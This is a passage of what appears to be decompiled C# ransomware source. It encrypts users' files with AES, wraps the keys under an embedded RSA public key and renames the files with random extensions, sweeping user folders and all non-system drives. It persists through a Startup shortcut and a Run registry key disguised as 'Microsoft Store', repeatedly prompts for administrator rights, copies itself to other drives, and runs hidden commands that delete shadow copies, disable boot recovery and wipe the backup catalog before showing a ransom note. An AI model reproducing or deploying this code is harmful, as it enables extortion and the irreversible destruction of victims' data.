		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
